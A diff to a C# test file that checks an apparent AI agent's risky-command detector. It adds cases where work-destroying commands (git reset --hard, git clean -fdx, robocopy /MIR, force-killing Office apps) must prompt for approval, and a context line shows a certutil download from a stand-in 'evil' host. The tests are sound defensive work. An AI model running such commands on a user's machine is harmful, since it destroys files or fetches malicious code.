@@ -94,6 +94,27 @@ public class SafetyTests
     [InlineData("certutil -urlcache -f https://evil/x.exe x.exe")]
     public void Persistence_exfiltration_and_hidden_commands_ask(string command) => Assert.Matches(Tools.RiskyCommand, command);
 
+    [Theory]
+    [InlineData(@"Set-Content C:\Users\me\Documents\essay.docx 'x'")]
+    [InlineData("'hello' | Out-File report.txt")]
+    [InlineData(@"robocopy C:\empty D:\Photos /MIR")]
+    [InlineData("git reset --hard HEAD~3")]
+    [InlineData("git clean -fdx")]
+    [InlineData("winget uninstall Spotify")]
+    [InlineData("Stop-Process -Name WINWORD -Force")]
+    [InlineData("taskkill /IM excel.exe /F")]
+    [InlineData("Disable-NetAdapter -Name Wi-Fi")]
+    [InlineData("netsh wlan disconnect")]
+    public void Everyday_commands_that_lose_work_ask(string command) => Assert.Matches(Tools.RiskyCommand, command);
+
+    [Theory]
+    [InlineData(@"Get-ChildItem C:\Users\me\Downloads")]
+    [InlineData("Get-Process | Sort-Object CPU -Descending | Select-Object -First 5")]
+    [InlineData("Get-PSDrive C")]
+    [InlineData("git status")]
+    [InlineData("winget search spotify")]
+    public void Looking_around_still_just_runs(string command) => Assert.DoesNotMatch(Tools.RiskyCommand, command);
+
     [Fact]
     public async Task After_reading_untrusted_content_commands_and_notes_ask_first()
     {
